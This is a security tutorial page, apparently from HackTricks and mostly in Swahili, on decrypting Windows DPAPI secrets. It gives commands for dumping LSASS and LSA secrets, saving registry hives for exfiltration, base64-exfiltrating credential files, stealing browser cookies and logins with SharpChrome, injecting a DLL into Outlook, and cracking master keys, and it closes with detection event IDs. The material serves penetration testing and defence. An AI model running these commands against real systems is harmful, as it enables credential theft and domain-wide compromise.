# DPAPI - Kutoa Nywila

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

The Data Protection API (DPAPI) inatumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya **symmetric encryption of asymmetric private keys**, ikitumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Mbinu hii inarahisisha encryption kwa watengenezaji kwa kuwawezesha kuficha data kwa kutumia ufunguo uliotokana na siri za kuingia za mtumiaji au, kwa encryption ya mfumo, siri za uthibitisho za domaine za mfumo, hivyo kuondoa hitaji la watengenezaji kusimamia ulinzi wa ufunguo wa encryption wenyewe.

Njia inayotumika zaidi kufikia DPAPI ni kupitia v-functions za **`CryptProtectData` and `CryptUnprotectData`**, ambazo zinawezesha applications kuficha na kufungua data kwa usalama kwa session ya process ambayo iko imeingia sasa. Hii ina maana kwamba data iliyofichwa inaweza kufunguliwa tu na mtumiaji au mfumo ule ule uliouificha.

Zaidi ya hayo, hizi functions zinakubali pia parameter ya **`entropy`** ambayo itatumika wakati wa encryption na decryption, kwa hivyo, ili kufungua kitu kilichofichwa kwa kutumia parameter hii, lazima utoe thamani ile ile ya entropy iliyotumika wakati wa encryption.

### Uundaji wa ufunguo wa mtumiaji

DPAPI inazalisha ufunguo wa kipekee (uitwacho **`pre-key`**) kwa kila mtumiaji kulingana na nyaraka zao za uthibitisho. Ufunguo huu unatokana na password ya mtumiaji na vipengele vingine na algorithm inategemea aina ya mtumiaji lakini mwisho wake huwa SHA1. Kwa mfano, kwa watumiaji wa domaine, **inategemea NTLM hash ya mtumiaji**.

Hii ni ya kuvutia hasa kwa sababu ikiwa mshambuliaji anaweza kupata hash ya password ya mtumiaji, wanaweza:

- **Kufungua (decrypt) data yoyote iliyofichwa kwa kutumia DPAPI** kwa ufunguo wa mtumiaji huyo bila kuhitaji kuwasiliana na API yoyote
- Kujaribu **kuchoma (crack) password** kwa mtandao wa offline kwa kujaribu kuzalisha ufunguo wa DPAPI sahihi

Zaidi ya hayo, kila mara data inapofichwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **funguo kuu** inazalishwa. Funguo hii kuu ndiyo inayotumiwa kwa kweli kuficha data. Kila funguo kuu hupewa **GUID** (Globally Unique Identifier) inayouitambulisha.

Funguo kuu zinahifadhiwa katika directory ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya mtumiaji huo. Funguo kuu inahifadhiwa ikiwa imefichwa kwa `pre-key` ya mtumiaji na pia na **domain backup key** kwa ajili ya urejeshaji (hivyo ufunguo ule ule unaohifadhiwa umefichwa mara 2 kwa njia 2 tofauti).

Kumbuka kwamba **domain key** inayotumika kuficha funguo kuu iko kwenye domain controllers na haibadiliki, hivyo ikiwa mshambuliaji ana ufikiaji wa domain controller, wanaweza kupata domain backup key na kufungua funguo kuu za watumiaji wote kwenye domaine.

Blobs zilizofichwa zinaonyesha **GUID ya funguo kuu** iliyotumika kuficha data ndani ya headers zake.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Pata funguo kuu:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hivi ndivyo kundi la Master Keys la mtumiaji litakavyoonekana:

![](<../../images/image (1121).png>)

### Uundaji wa funguo za Mashine/System

Hii ni funguo inayotumika na mashine kuficha (encrypt) data. Inatokana na **DPAPI_SYSTEM LSA secret**, ambayo ni funguo maalum ambayo mtumiaji wa SYSTEM pekee anaweza kufikia. Funguo hii inatumiwa kuficha data inayohitajika kufikiwa na system yenyewe, kama vile cheti za ngazi ya mashine au siri za ngazi ya system.

Kumbuka kuwa funguo hizi **hazina domain backup** hivyo zinapatikana tu ndani ya mashine:

- **Mimikatz** inaweza kuzifikia kwa ku-dump LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
- Siri hiyo imehifadhiwa ndani ya registry, hivyo msimamizi anaweza **kubadilisha ruhusa za DACL ili kuifikia**. Njia ya registry ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Utoaji wa offline kutoka registry hives pia unawezekana. Kwa mfano, kama msimamizi kwenye target, hifadhi hives na exfiltrate hizo:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Kisha kwenye kifaa chako cha uchambuzi, pata siri ya DPAPI_SYSTEM LSA kutoka kwa hives na itumie ku-decrypt blobs za kiwango cha mashine (nywila za kazi zilizopangwa, kredenshiali za huduma, profaili za Wi‑Fi, nk):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Data zilizolindwa na DPAPI

Miongoni mwa data binafsi zilizolindwa na DPAPI ni:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- Nywila za barua pepe na za akaunti za FTP za ndani kwa programu kama Outlook na Windows Mail
- Nywila za folda zilizoshirikiwa, rasilimali, mitandao isiyo na waya, na Windows Vault, ikijumuisha funguo za usimbaji
- Nywila za muunganisho wa remote desktop, .NET Passport, na funguo za kibinafsi kwa madhumuni mbalimbali ya usimbaji na uthibitisho
- Nywila za mtandao zinazosimamiwa na Credential Manager na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, n.k.
- Encrypted blobs inside the registry
- ...

System protected data includes:
- Nywila za Wi‑Fi
- Nywila za kazi zilizopangwa
- ...

### Chaguo za kunasa master key

- Ikiwa mtumiaji ana haki za domain admin, wanaweza kupata **domain backup key** ili kufungua master keys zote za watumiaji ndani ya domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Kwa ruhusa za admin za ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa funguo kuu za DPAPI za watumiaji wote waliounganishwa pamoja na ufunguo wa SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana local admin privileges, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili ku-decrypt machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa password au hash NTLM ya mtumiaji inajulikana, unaweza **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya kikao kama mtumiaji, inawezekana kumuomba DC kwa **backup key to decrypt the master keys using RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **steal his session token** kwa hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodha ya Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kufikia Data Iliyofichwa na DPAPI

### Tafuta Data Iliyofichwa na DPAPI

Mafaili ya watumiaji **yaliyolindwa** kwa kawaida yamo katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Angalia pia kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata blobs zilizosimbwa kwa DPAPI kwenye mfumo wa faili, registry na blobs za B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo ileile) inaweza kutumika ku-decrypt data nyeti kwa kutumia DPAPI, kama cookies.

#### Chromium/Edge/Electron mbinu za haraka (SharpChrome)

- Current user, interactive decryption of saved logins/cookies (inafanya kazi hata na Chrome 127+ app-bound cookies kwa sababu funguo ya ziada inapotatuliwa kutoka kwa Credential Manager ya mtumiaji wakati inapoendeshwa katika muktadha wa mtumiaji):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Uchambuzi wa offline wakati una faili tu. Kwanza extract AES state key kutoka kwenye profile’s "Local State" kisha itumie ku-decrypt cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage ya Domain-wide/remote wakati una DPAPI domain backup key (PVK) na admin kwenye target host:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na moja kwa moja ku-decrypt data za profaili:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Vidokezo
- Mijengo mipya ya Chrome/Edge inaweza kuhifadhi cookies fulani kwa kutumia "App-Bound" encryption. Offline decryption ya cookies hizo maalum haiwezekani bila app-bound key ya ziada; endesha SharpChrome chini ya muktadha wa mtumiaji lengwa ili kuipata moja kwa moja. Angalia chapisho la blogu la usalama la Chrome lililotajwa hapa chini.

### Funguo za ufikiaji na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwa DPAPI encrypted files kutoka kwa session ya sasa:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata taarifa za credentials** kama encrypted data na guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Fungua masterkey ya mtumiaji aliyeomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Zana ya **SharpDPAPI** pia inasaidia vigezo hivi kwa ajili ya kuvunjwa kwa masterkey (kumbuka jinsi inavyowezekana kutumia `/rpc` kupata ufunguo wa chelezo wa domain, `/password` kutumia nenosiri wazi, au `/pvk` kubainisha faili ya ufunguo binafsi wa DPAPI domain...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Fungua data iliyosimbwa kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inaunga mkono vigezo hivi kwa ajili ya `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (angalia jinsi inavyowezekana kutumia `/rpc` kupata domains backup key, `/password` kutumia plaintext password, `/pvk` kubainisha DPAPI domain private key file, `/unprotect` kutumia current users session...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Kutumia DPAPI prekey/credkey moja kwa moja (no password needed)

Ikiwa unaweza dump LSASS, Mimikatz mara nyingi huonyesha per-logon DPAPI key inayoweza kutumika ku-decrypt masterkeys za mtumiaji bila kujua plaintext password. Pitisha thamani hii moja kwa moja kwa tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Fungua baadhi ya data zilizosimbwa kwa kutumia **kikao cha mtumiaji wa sasa**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Dekripsheni bila mtandao kwa Impacket dpapi.py

Kama una SID ya mtumiaji wa mwathirika na nywila (au NT hash), unaweza ku-decrypt DPAPI masterkeys na Credential Manager blobs kabisa bila mtandao ukitumia Impacket’s dpapi.py.

- Tambua artefacts kwenye diski:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- masterkey inayolingana: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa zana za kuhamisha faili hazitegemewe, base64 faili hizo kwenye mashine mwenyeji na nakili matokeo:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Dekripti masterkey kwa kutumia SID ya mtumiaji na password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Tumia decrypted masterkey ili ku-decrypt credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Mtiririko huu mara nyingi hurudisha cheti za domain zilizohifadhiwa na programu zinazotumia Windows Credential Manager, ikiwa ni pamoja na akaunti za kiutawala (mfano, `*_adm`).

---

### Kushughulikia Entropy ya Hiari ("Third-party entropy")

Baadhi ya programu hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi kufunguliwa, hata kama masterkey sahihi inajulikana. Kupata entropy ni muhimu wakati wa kulenga cheti zilizolindwa kwa njia hii (kwa mfano Microsoft Outlook, baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode ambayo ina-hook DPAPI functions ndani ya mchakato lengwa na kwa uwazi inarekodi entropy ya hiari yoyote inayotolewa. Kuendesha EntropyCapture katika mode ya **DLL-injection** dhidi ya mchakato kama `outlook.exe` au `vpnclient.exe` kutaweka faili inayompa ramani kila buffer ya entropy kwa mchakato uliouita pamoja na blob. Entropy iliyorekodiwa baadaye inaweza kutumwa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufungua data.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha muundo wa masterkey **context 3** kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3) zikioruhusu GPU-accelerated cracking ya nywila za watumiaji moja kwa moja kutoka kwenye faili ya masterkey. Wavamizi wanaweza kwa hivyo kufanya word-list or brute-force attacks bila kuingiliana na mfumo lengwa.

`DPAPISnoop` (2024) inaotomatiza mchakato:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Zana pia inaweza kuchambua Credential na Vault blobs, ku-decrypt kwa cracked keys na ku-export cleartext passwords.

### Kufikia data za mashine nyingine

Katika **SharpDPAPI and SharpChrome** unaweza kubainisha chaguo **`/server:HOST`** ili kufikia data za mashine ya mbali. Bila shaka unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kwamba **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayoboreshwa kutoa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP na kuchoma key ya backup ya domain controller kupitia RPC. Script itakayofuata itatatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata blobs zote za DPAPI za watumiaji wote na kufungua kila kitu kwa kutumia domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa orodha ya kompyuta iliyoichimbuliwa kutoka LDAP unaweza kupata kila subnet hata kama hukuwajua!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kuchoma siri zilizopewa ulinzi na DPAPI moja kwa moja. Toleo la 2.x liliweka:

* Ukusanyaji sambamba wa blobs kutoka mamia ya hosts
* Ufafanuzi wa masterkeys za **context 3** na ujumuishaji wa Hashcat kwa uvetesaji wa kiotomatiki
* Msaada kwa Chrome "App-Bound" encrypted cookies (angalia sehemu inayofuata)
* Mode mpya ya **`--snapshot`** ili kuzunguka mara kwa mara endpoints na kutofautisha blobs zilizoundwa mpya

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# kwa masterkey/credential/vault files inayoweza kutoa formats za Hashcat/JtR na hiari kuitisha cracking kiotomatiki. Inaunga mkono kikamilifu machine na user masterkey formats hadi Windows 11 24H1.

## Utambuzi wa kawaida

- Kufikia faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
- Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana ili kufikia kumbukumbu ya LSASS au kuchoma masterkeys.
- Event **4662**: *An operation was performed on an object* – inaweza kuunganishwa na upatikanaji wa kitu **`BCKUPKEY`**.
- Event **4673/4674** wakati mchakato unapokuwa unaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Udhaifu & mabadiliko ya mazingira 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Novemba 2023). Mshambulizi mwenye upatikanaji wa mtandao angeweza kumdanganya mwanachama wa domain kuvuta DPAPI backup key mbaya, kuruhusu ufunguzo wa masterkeys za watumiaji. Imefikishwa patishi katika cumulative update ya Novemba 2023 – wasimamizi wanapaswa kuhakikisha DCs na workstations zimepatishwa kabisa.
* **Chrome 127 “App-Bound” cookie encryption** (Julai 2024) ilibadilisha ulinzi wa DPAPI pekee kwa kuongezea key iliyohifadhiwa chini ya **Credential Manager** ya mtumiaji. Uvunaji wa cookies bila mtandao sasa unahitaji masterkey ya DPAPI pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zina uwezo wa kuponya key ya ziada zinapotekelezwa kwa muktadha wa mtumiaji.

### Uchunguzi wa Kesi: Zscaler Client Connector – Entropy Maalum Iliyotokana na SID

Zscaler Client Connector inahifadhi faili kadhaa za usanidi chini ya `C:\ProgramData\Zscaler` (mfano `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili imefungwa kwa **DPAPI (Machine scope)** lakini vendor hutoa **entropy maalum** inayohesabiwa wakati wa utekelezaji badala ya kuhifadhiwa diski.

Entropy hiyo inajengwa upya kutoka kwa vipengele viwili:

1. Siri iliyowekwa kwa nguvu ndani ya `ZSACredentialProvider.dll`.
2. The **SID** ya akaunti ya Windows ambayo usanidi unamilikiwa nayo.

Algorithm inayotekelezwa na DLL ni sawa na:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa sababu siri imewekwa ndani ya DLL ambayo inaweza kusomwa kutoka diski, **mshambuliaji wa ndani yeyote mwenye haki za SYSTEM anaweza kuzalisha upya entropy kwa SID yoyote** na decrypt the blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Ufichaji (decryption) hutoa usanidi kamili wa JSON, ikijumuisha kila **device posture check** na thamani yake iliyotarajiwa – taarifa ambayo ni ya thamani kubwa wakati wa kujaribu client-side bypasses.

> TIP: vibaki vingine vilivyofichwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) vinalindwa na DPAPI **bila** entropy (`16` zero bytes). Kwa hiyo vinaweza kufunguliwa moja kwa moja kwa kutumia `ProtectedData.Unprotect` mara tu ruhusa za SYSTEM zitakapopatikana.

## Marejeo

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
